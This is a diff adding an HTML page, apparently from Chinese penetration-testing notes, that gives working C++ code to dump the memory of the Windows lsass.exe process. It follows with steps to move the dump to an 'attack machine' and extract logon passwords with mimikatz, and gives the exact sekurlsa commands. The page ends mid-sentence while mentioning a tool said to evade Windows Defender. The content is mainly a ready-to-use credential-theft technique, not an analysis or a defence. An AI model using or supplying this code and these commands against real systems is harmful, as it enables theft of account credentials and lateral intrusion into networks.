@@ -1,0 +1,42 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="利用windows-api-dump进程"><span class="csECDA2D3">利用</span><span class="csDE05BCC">windows api dump</span><span class="csECDA2D3">进程</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="c源代码"><span class="csB2D98684">c++</span><span class="cs83F14626">源代码</span></a></h2>
+		<p class="cs3A447A38"><span class="cs9FB05234">#include &quot;stdafx.h&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;windows.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;DbgHelp.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;iostream&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;TlHelp32.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">using namespace std;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">int main() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;DWORD lsassPID = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HANDLE lsassHandle = NULL; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HANDLE outFile = CreateFile(L&quot;lsass.dmp&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PROCESSENTRY32 processEntry = {};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;processEntry.dwSize = sizeof(PROCESSENTRY32);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;LPCWSTR processName = L&quot;&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (Process32First(snapshot, &amp;processEntry)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (_wcsicmp(processName, L&quot;lsass.exe&quot;) != 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process32Next(snapshot, &amp;processEntry);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processName = processEntry.szExeFile;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lsassPID = processEntry.th32ProcessID;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wcout &lt;&lt; &quot;[+] Got lsass.exe PID: &quot; &lt;&lt; lsassPID &lt;&lt; endl;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (isDumped) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cout &lt;&lt; &quot;[+] lsass dumped successfully!&quot; &lt;&lt; endl;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://github.com/ianxtianxt/windows-api-dump/"><span class="cs4B51D5E4">https://github.com/ianxtianxt/windows-api-dump/</span></a></span></p><h2 class="cs868C439D">
+			<a name="执行演示"><span class="cs83F14626">执行演示</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="执行createminidumpexe（上面的编译文件）或编译自己的二进制文件"><span class="csD6CA00D2">执行</span><span class="csD1E291E2">CreateMiniDump.exe</span><span class="csD6CA00D2">（上面的编译文件）或编译自己的二进制文件</span></a></h3>
+		<h3 class="cs868C439D">
+			<a name="lsassdmp被转储到工作目录"><span class="csD1E291E2">Lsass.dmp</span><span class="csD6CA00D2">被转储到工作目录</span></a></h3>
+		<h3 class="cs868C439D">
+			<a name="让lsassdmp离线到你的攻击机器上"><span class="csD6CA00D2">让</span><span class="csD1E291E2">lsass.dmp</span><span class="csD6CA00D2">离线到你的攻击机器上</span></a></h3>
+		<h3 class="cs868C439D">
+			<a name="打开mimikatz并加载到转储文件中"><span class="csD6CA00D2">打开</span><span class="csD1E291E2">mimikatz</span><span class="csD6CA00D2">并加载到转储文件中</span></a></h3>
+		<h3 class="cs868C439D">
+			<a name="储存密码"><span class="csD6CA00D2">储存密码</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs8926E06">.\createminidump.exe .\mimikatz.exe sekurlsa::minidump c:\temp\lsass.dmp sekurlsa::logonpasswords</span></p><p class="cs40DD2BC9"><span><img src="内网渗透/内网渗透/%e5%88%a9%e7%94%a8windows%20api%20dump%e8%bf%9b%e7%a8%8b_files/image0.gif" width="560" height="334" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="内网渗透/内网渗透/%e5%88%a9%e7%94%a8windows%20api%20dump%e8%bf%9b%e7%a8%8b_files/image1.gif" width="560" height="305" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以在</span><span class="cs8926E06">mimikatz</span><span class="cs9C1B1871">中离线读取</span></p><p class="cs40DD2BC9"><span><img src="内网渗透/内网渗透/%e5%88%a9%e7%94%a8windows%20api%20dump%e8%bf%9b%e7%a8%8b_files/image0.png" width="560" height="357" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里有一个</span><span class="cs8926E06">pdocdump</span><span class="cs9C1B1871">可以执行相同的操作，并且不会被</span><span class="cs8926E06">windows d</span></p></body>
+</html>
